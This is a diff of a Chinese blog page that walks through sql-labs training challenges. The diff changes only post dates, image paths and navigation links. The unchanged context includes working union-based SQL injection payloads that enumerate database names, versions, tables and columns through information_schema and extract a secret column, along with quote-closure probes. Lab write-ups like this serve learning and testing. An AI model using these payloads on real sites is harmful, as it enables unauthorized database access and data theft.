@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-06-01 00:34" pubdate>
-        June 1, 2020 am
+      <time datetime="2020-01-01 00:34" pubdate>
+        January 1, 2020 am
       </time>
     </span>
   
@@ -299,25 +299,25 @@
 </blockquote>
 <p> 第一关先按正常步骤来，后面的直接贴关键的了</p>
 <p>1.找闭合，单引号闭合</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143225062.png" srcset="/img/loading.gif" alt="image-20210222143225062"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143241840.png" srcset="/img/loading.gif" alt="image-20210222143241840"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143225062.png" srcset="/img/loading.gif" alt="image-20210222143225062"><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143241840.png" srcset="/img/loading.gif" alt="image-20210222143241840"></p>
 <p>单引号不正常，双引号正常，则闭合为单引号</p>
 <p>2.找字段数：3</p>
 <p>这一步试了很多，注释符用<code>#</code>注释不了，只能用<code>--+</code>，而且不能用<code>order by</code>进行判断，只能用 <code>union select</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143750422.png" srcset="/img/loading.gif" alt="image-20210222143750422"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143813899.png" srcset="/img/loading.gif" alt="image-20210222143813899"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143750422.png" srcset="/img/loading.gif" alt="image-20210222143750422"><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143813899.png" srcset="/img/loading.gif" alt="image-20210222143813899"></p>
 <p>3.爆数据库，这一关已经给出数据库是’CHALLENGES’了，所以不用查了，但是往往需要自己查，payload如下</p>
 <p><code>?id=-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os),user()  --+</code></p>
 <p>4.爆表名：</p>
 <p>payload:<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;CHALLENGES&#39; --+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222141724070.png" srcset="/img/loading.gif" alt="image-20210222141724070"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222141724070.png" srcset="/img/loading.gif" alt="image-20210222141724070"></p>
 <p>5.爆字段</p>
 <p>payload：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;5t0md80073&#39;--+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222141842212.png" srcset="/img/loading.gif" alt="image-20210222141842212"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222141842212.png" srcset="/img/loading.gif" alt="image-20210222141842212"></p>
 <p>有一个secret_9PML，猜测 Secret Key在这个里面</p>
 <p>6.爆数据</p>
 <p>payload：<code>?id=-1&#39; union select 1,2,group_concat(secret_9PML) from challenges.5t0md80073--+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222142214759.png" srcset="/img/loading.gif" alt="image-20210222142214759"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222142214759.png" srcset="/img/loading.gif" alt="image-20210222142214759"></p>
 <p>7.验证结果，正确！</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222142251627.png" srcset="/img/loading.gif" alt="image-20210222142251627"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222142251627.png" srcset="/img/loading.gif" alt="image-20210222142251627"></p>
 <h3 id="Less55：GET-union查询-每轮允许14次-1"><a href="#Less55：GET-union查询-每轮允许14次-1" class="headerlink" title="Less55：GET-union查询-每轮允许14次-1"></a>Less55：GET-union查询-每轮允许14次-1</h3><p>判断闭合</p>
 <pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1                正确回显
 ?<span class="hljs-attribute">id</span>=1&#x27;      无错误异常回显
@@ -353,8 +353,8 @@
 ?<span class="hljs-attribute">id</span>=1&#x27; -- #		正常回显</code></pre>
 
 <p>这一关无法使用union查询，看图</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235011326.png" srcset="/img/loading.gif" alt="image-20210222235011326"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235043270.png" srcset="/img/loading.gif" alt="image-20210222235043270"></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235600326.png" srcset="/img/loading.gif" alt="image-20210222235600326" style="zoom: 67%;"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235625583.png" srcset="/img/loading.gif" alt="image-20210222235625583" style="zoom:80%;"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235011326.png" srcset="/img/loading.gif" alt="image-20210222235011326"><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235043270.png" srcset="/img/loading.gif" alt="image-20210222235043270"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235600326.png" srcset="/img/loading.gif" alt="image-20210222235600326" style="zoom: 67%;"><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235625583.png" srcset="/img/loading.gif" alt="image-20210222235625583" style="zoom:80%;"></p>
 <p>其他都一样</p>
 <p> 使用group_concat()函数进行双注入报错</p>
 <p>payload</p>
@@ -402,9 +402,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                      <a href="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件上传</span>
+                        <span class="hidden-mobile">sql-labs记录2</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -412,8 +412,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/">
-                        <span class="hidden-mobile">sql-labs记录2</span>
+                      <a href="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/">
+                        <span class="hidden-mobile">sql-labs记录1</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
